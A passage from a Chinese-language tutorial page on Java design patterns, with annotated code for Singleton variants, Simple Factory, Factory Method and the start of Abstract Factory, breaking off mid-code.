title="一、概述"></a>一、概述</h1><p>设计模式是解决问题的方案，学习现有的设计模式可以做到经验复用。</p><p>拥有设计模式词汇，在沟通时就能用更少的词汇来讨论，并且不需要了解底层细节。</p><p><a href="https://github.com/CyC2018/Design-Pattern-Java">源码以及 UML 图</a></p><h1 id="二、创建型"><a href="#二、创建型" class="headerlink" title="二、创建型"></a>二、创建型</h1><h2 id="1-单例（Singleton）"><a href="#1-单例（Singleton）" class="headerlink" title="1. 单例（Singleton）"></a>1. 单例（Singleton）</h2><h3 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h3><p>确保一个类只有一个实例，并提供该实例的全局访问点。</p><h3 id="Class-Diagram"><a href="#Class-Diagram" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>使用一个私有构造函数、一个私有静态变量以及一个公有静态函数来实现。</p><p>私有构造函数保证了不能通过构造函数来创建对象实例，只能通过公有静态函数返回唯一的私有静态变量。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/562f2844-d77c-40e0-887a-28a7128abd42.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/562f2844-d77c-40e0-887a-28a7128abd42.png" alt="img"></a></p><h3 id="Implementation"><a href="#Implementation" class="headerlink" title="Implementation"></a>Implementation</h3><h4 id="Ⅰ-懒汉式-线程不安全"><a href="#Ⅰ-懒汉式-线程不安全" class="headerlink" title="Ⅰ 懒汉式-线程不安全"></a>Ⅰ 懒汉式-线程不安全</h4><p>以下实现中，私有静态变量 uniqueInstance 被延迟实例化，这样做的好处是，如果没有用到该类，那么就不会实例化 uniqueInstance，从而节约资源。</p><p>这个实现在多线程环境下是不安全的，如果多个线程能够同时进入 <code>if (uniqueInstance == null)</code> ，并且此时 uniqueInstance 为 null，那么会有多个线程执行 <code>uniqueInstance = new Singleton();</code> 语句，这将导致实例化多次 uniqueInstance。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> Singleton uniqueInstance<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Singleton <span class="token function">getUniqueInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>uniqueInstance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            uniqueInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> uniqueInstance<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="Ⅱ-饿汉式-线程安全"><a href="#Ⅱ-饿汉式-线程安全" class="headerlink" title="Ⅱ 饿汉式-线程安全"></a>Ⅱ 饿汉式-线程安全</h4><p>线程不安全问题主要是由于 uniqueInstance 被实例化多次，采取直接实例化 uniqueInstance 的方式就不会产生线程不安全问题。</p><p>但是直接实例化的方式也丢失了延迟实例化带来的节约资源的好处。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">private</span> <span class="token keyword">static</span> Singleton uniqueInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h4 id="Ⅲ-懒汉式-线程安全"><a href="#Ⅲ-懒汉式-线程安全" class="headerlink" title="Ⅲ 懒汉式-线程安全"></a>Ⅲ 懒汉式-线程安全</h4><p>只需要对 getUniqueInstance() 方法加锁，那么在一个时间点只能有一个线程能够进入该方法，从而避免了实例化多次 uniqueInstance。</p><p>但是当一个线程进入该方法之后，其它试图进入该方法的线程都必须等待，即使 uniqueInstance 已经被实例化了。这会让线程阻塞时间过长，因此该方法有性能问题，不推荐使用。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">synchronized</span> Singleton <span class="token function">getUniqueInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>uniqueInstance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>        uniqueInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> uniqueInstance<span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h4 id="Ⅳ-双重校验锁-线程安全"><a href="#Ⅳ-双重校验锁-线程安全" class="headerlink" title="Ⅳ 双重校验锁-线程安全"></a>Ⅳ 双重校验锁-线程安全</h4><p>uniqueInstance 只需要被实例化一次，之后就可以直接使用了。加锁操作只需要对实例化那部分的代码进行，只有当 uniqueInstance 没有被实例化时，才需要进行加锁。</p><p>双重校验锁先判断 uniqueInstance 是否已经被实例化，如果没有被实例化，那么才对实例化语句进行加锁。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">static</span> Singleton uniqueInstance<span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Singleton <span class="token function">getUniqueInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>uniqueInstance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>Singleton<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">if</span> <span class="token punctuation">(</span>uniqueInstance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>                    uniqueInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> uniqueInstance<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>考虑下面的实现，也就是只使用了一个 if 语句。在 uniqueInstance == null 的情况下，如果两个线程都执行了 if 语句，那么两个线程都会进入 if 语句块内。虽然在 if 语句块内有加锁操作，但是两个线程都会执行 <code>uniqueInstance = new Singleton();</code> 这条语句，只是先后的问题，那么就会进行两次实例化。因此必须使用双重校验锁，也就是需要使用两个 if 语句。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">if</span> <span class="token punctuation">(</span>uniqueInstance <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">synchronized</span> <span class="token punctuation">(</span>Singleton<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        uniqueInstance <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>uniqueInstance 采用 volatile 关键字修饰也是很有必要的， <code>uniqueInstance = new Singleton();</code> 这段代码其实是分为三步执行：</p><ol><li>为 uniqueInstance 分配内存空间</li><li>初始化 uniqueInstance</li><li>将 uniqueInstance 指向分配的内存地址</li></ol><p>但是由于 JVM 具有指令重排的特性，执行顺序有可能变成 1&gt;3&gt;2。指令重排在单线程环境下不会出现问题，但是在多线程环境下会导致一个线程获得还没有初始化的实例。例如，线程 T1 执行了 1 和 3，此时 T2 调用 getUniqueInstance() 后发现 uniqueInstance 不为空，因此返回 uniqueInstance，但此时 uniqueInstance 还未被初始化。</p><p>使用 volatile 可以禁止 JVM 的指令重排，保证在多线程环境下也能正常运行。</p><h4 id="Ⅴ-静态内部类实现"><a href="#Ⅴ-静态内部类实现" class="headerlink" title="Ⅴ 静态内部类实现"></a>Ⅴ 静态内部类实现</h4><p>当 Singleton 类加载时，静态内部类 SingletonHolder 没有被加载进内存。只有当调用 <code>getUniqueInstance()</code> 方法从而触发 <code>SingletonHolder.INSTANCE</code> 时 SingletonHolder 才会被加载，此时初始化 INSTANCE 实例，并且 JVM 能确保 INSTANCE 只被实例化一次。</p><p>这种方式不仅具有延迟初始化的好处，而且由 JVM 提供了对线程安全的支持。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Singleton</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token function">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">SingletonHolder</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> Singleton INSTANCE <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Singleton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> Singleton <span class="token function">getUniqueInstance</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> SingletonHolder<span class="token punctuation">.</span>INSTANCE<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h4 id="Ⅵ-枚举实现"><a href="#Ⅵ-枚举实现" class="headerlink" title="Ⅵ 枚举实现"></a>Ⅵ 枚举实现</h4><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">enum</span> Singleton <span class="token punctuation">{</span>    INSTANCE<span class="token punctuation">;</span>    <span class="token keyword">private</span> String objName<span class="token punctuation">;</span>    <span class="token keyword">public</span> String <span class="token function">getObjName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> objName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setObjName</span><span class="token punctuation">(</span>String objName<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>objName <span class="token operator">=</span> objName<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 单例测试</span>        Singleton firstSingleton <span class="token operator">=</span> Singleton<span class="token punctuation">.</span>INSTANCE<span class="token punctuation">;</span>        firstSingleton<span class="token punctuation">.</span><span class="token function">setObjName</span><span class="token punctuation">(</span><span class="token string">"firstName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>firstSingleton<span class="token punctuation">.</span><span class="token function">getObjName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Singleton secondSingleton <span class="token operator">=</span> Singleton<span class="token punctuation">.</span>INSTANCE<span class="token punctuation">;</span>        secondSingleton<span class="token punctuation">.</span><span class="token function">setObjName</span><span class="token punctuation">(</span><span class="token string">"secondName"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>firstSingleton<span class="token punctuation">.</span><span class="token function">getObjName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>secondSingleton<span class="token punctuation">.</span><span class="token function">getObjName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// 反射获取实例测试</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Singleton<span class="token punctuation">[</span><span class="token punctuation">]</span> enumConstants <span class="token operator">=</span> Singleton<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">getEnumConstants</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span>Singleton enumConstant <span class="token operator">:</span> enumConstants<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>enumConstant<span class="token punctuation">.</span><span class="token function">getObjName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">Exception</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>firstNamesecondNamesecondNamesecondName</code></pre><p>该实现在多次序列化再进行反序列化之后，不会得到多个实例。而其它实现需要使用 transient 修饰所有字段，并且实现序列化和反序列化的方法。</p><p>该实现可以防止反射攻击。在其它实现中，通过 setAccessible() 方法可以将私有构造函数的访问级别设置为 public，然后调用构造函数从而实例化对象，如果要防止这种攻击，需要在构造函数中添加防止多次实例化的代码。该实现是由 JVM 保证只会实例化一次，因此不会出现上述的反射攻击。</p><h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><ul><li>Logger Classes</li><li>Configuration Classes</li><li>Accesing resources in shared mode</li><li>Factories implemented as Singletons</li></ul><h3 id="JDK"><a href="#JDK" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/Runtime.html#getRuntime%28%29" target="_blank" rel="noopener">java.lang.Runtime#getRuntime()</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/awt/Desktop.html#getDesktop--" target="_blank" rel="noopener">java.awt.Desktop#getDesktop()</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/lang/System.html#getSecurityManager--" target="_blank" rel="noopener">java.lang.System#getSecurityManager()</a></li></ul><h2 id="2-简单工厂（Simple-Factory）"><a href="#2-简单工厂（Simple-Factory）" class="headerlink" title="2. 简单工厂（Simple Factory）"></a>2. 简单工厂（Simple Factory）</h2><h3 id="Intent-1"><a href="#Intent-1" class="headerlink" title="Intent"></a>Intent</h3><p>在创建一个对象时不向客户暴露内部细节，并提供一个创建对象的通用接口。</p><h3 id="Class-Diagram-1"><a href="#Class-Diagram-1" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>简单工厂把实例化的操作单独放到一个类中，这个类就成为简单工厂类，让简单工厂类来决定应该用哪个具体子类来实例化。</p><p>这样做能把客户类和具体子类的实现解耦，客户类不再需要知道有哪些子类以及应当实例化哪个子类。客户类往往有多个，如果不使用简单工厂，那么所有的客户类都要知道所有子类的细节。而且一旦子类发生改变，例如增加子类，那么所有的客户类都要进行修改。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/c79da808-0f28-4a36-bc04-33ccc5b83c13.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/c79da808-0f28-4a36-bc04-33ccc5b83c13.png" alt="img"></a></p><h3 id="Implementation-1"><a href="#Implementation-1" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">interface</span> <span class="token class-name">Product</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteProduct</span> <span class="token keyword">implements</span> <span class="token class-name">Product</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteProduct1</span> <span class="token keyword">implements</span> <span class="token class-name">Product</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteProduct2</span> <span class="token keyword">implements</span> <span class="token class-name">Product</span> <span class="token punctuation">{</span><span class="token punctuation">}</span></code></pre><p>以下的 Client 类包含了实例化的代码，这是一种错误的实现。如果在客户类中存在这种实例化代码，就需要考虑将代码放到简单工厂中。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> type <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        Product product<span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            product <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            product <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>            product <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// do something with the product</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>以下的 SimpleFactory 是简单工厂实现，它被所有需要进行实例化的客户类调用。</p><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">SimpleFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Product <span class="token function">createProduct</span><span class="token punctuation">(</span><span class="token keyword">int</span> type<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>type <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Client</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        SimpleFactory simpleFactory <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SimpleFactory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Product product <span class="token operator">=</span> simpleFactory<span class="token punctuation">.</span><span class="token function">createProduct</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// do something with the product</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="3-工厂方法（Factory-Method）"><a href="#3-工厂方法（Factory-Method）" class="headerlink" title="3. 工厂方法（Factory Method）"></a>3. 工厂方法（Factory Method）</h2><h3 id="Intent-2"><a href="#Intent-2" class="headerlink" title="Intent"></a>Intent</h3><p>定义了一个创建对象的接口，但由子类决定要实例化哪个类。工厂方法把实例化操作推迟到子类。</p><h3 id="Class-Diagram-2"><a href="#Class-Diagram-2" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>在简单工厂中，创建对象的是另一个类，而在工厂方法中，是由子类来创建对象。</p><p>下图中，Factory 有一个 doSomething() 方法，这个方法需要用到一个产品对象，这个产品对象由 factoryMethod() 方法创建。该方法是抽象的，需要由子类去实现。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/1818e141-8700-4026-99f7-900a545875f5.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/1818e141-8700-4026-99f7-900a545875f5.png" alt="img"></a></p><h3 id="Implementation-2"><a href="#Implementation-2" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Factory</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> <span class="token keyword">public</span> Product <span class="token function">factoryMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">doSomething</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        Product product <span class="token operator">=</span> <span class="token function">factoryMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// do something with the product</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteFactory</span> <span class="token keyword">extends</span> <span class="token class-name">Factory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Product <span class="token function">factoryMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteFactory1</span> <span class="token keyword">extends</span> <span class="token class-name">Factory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Product <span class="token function">factoryMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteFactory2</span> <span class="token keyword">extends</span> <span class="token class-name">Factory</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> Product <span class="token function">factoryMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ConcreteProduct2</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h3 id="JDK-1"><a href="#JDK-1" class="headerlink" title="JDK"></a>JDK</h3><ul><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/Calendar.html#getInstance--" target="_blank" rel="noopener">java.util.Calendar</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/util/ResourceBundle.html#getBundle-java.lang.String-" target="_blank" rel="noopener">java.util.ResourceBundle</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/text/NumberFormat.html#getInstance--" target="_blank" rel="noopener">java.text.NumberFormat</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/nio/charset/Charset.html#forName-java.lang.String-" target="_blank" rel="noopener">java.nio.charset.Charset</a></li><li><a href="http://docs.oracle.com/javase/8/docs/api/java/net/URLStreamHandlerFactory.html#createURLStreamHandler-java.lang.String-" target="_blank" rel="noopener">java.net.URLStreamHandlerFactory</a></li><li><a href="https://docs.oracle.com/javase/8/docs/api/java/util/EnumSet.html#of-E-" target="_blank" rel="noopener">java.util.EnumSet</a></li><li><a href="https://docs.oracle.com/javase/8/docs/api/javax/xml/bind/JAXBContext.html#createMarshaller--" target="_blank" rel="noopener">javax.xml.bind.JAXBContext</a></li></ul><h2 id="4-抽象工厂（Abstract-Factory）"><a href="#4-抽象工厂（Abstract-Factory）" class="headerlink" title="4. 抽象工厂（Abstract Factory）"></a>4. 抽象工厂（Abstract Factory）</h2><h3 id="Intent-3"><a href="#Intent-3" class="headerlink" title="Intent"></a>Intent</h3><p>提供一个接口，用于创建 <strong>相关的对象家族</strong> 。</p><h3 id="Class-Diagram-3"><a href="#Class-Diagram-3" class="headerlink" title="Class Diagram"></a>Class Diagram</h3><p>抽象工厂模式创建的是对象家族，也就是很多对象而不是一个对象，并且这些对象是相关的，也就是说必须一起创建出来。而工厂方法模式只是用于创建一个对象，这和抽象工厂模式有很大不同。</p><p>抽象工厂模式用到了工厂方法模式来创建单一对象，AbstractFactory 中的 createProductA() 和 createProductB() 方法都是让子类来实现，这两个方法单独来看就是在创建一个对象，这符合工厂方法模式的定义。</p><p>至于创建对象的家族这一概念是在 Client 体现，Client 要通过 AbstractFactory 同时调用两个方法来创建出两个对象，在这里这两个对象就有很大的相关性，Client 需要同时创建出这两个对象。</p><p>从高层次来看，抽象工厂使用了组合，即 Cilent 组合了 AbstractFactory，而工厂方法模式使用了继承。</p><p><a href="https://github.com/CyC2018/CS-Notes/blob/master/docs/notes/pics/8668a3e1-c9c7-4fcb-98b2-a96a5d841579.png"><img src="https://github.com/CyC2018/CS-Notes/raw/master/docs/notes/pics/8668a3e1-c9c7-4fcb-98b2-a96a5d841579.png" alt="img"></a></p><h3 id="Implementation-3"><a href="#Implementation-3" class="headerlink" title="Implementation"></a>Implementation</h3><pre class=" language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AbstractProductA</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AbstractProductB</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductA1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractProductA</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductA2</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractProductA</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductB1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractProductB</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ProductB2</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractProductB</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">AbstractFactory</span> <span class="token punctuation">{</span>    <span class="token keyword">abstract</span> AbstractProductA <span class="token function">createProductA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">abstract</span> AbstractProductB <span class="token function">createProductB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ConcreteFactory1</span> <span class="token keyword">extends</span> <span class="token class-name">AbstractFactory</span> <span class="token punctuation">{</span>    AbstractProductA <span class="token function">createProductA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token class-name">ProductA1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    AbstractProductB <span class="token function">createProductB</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token 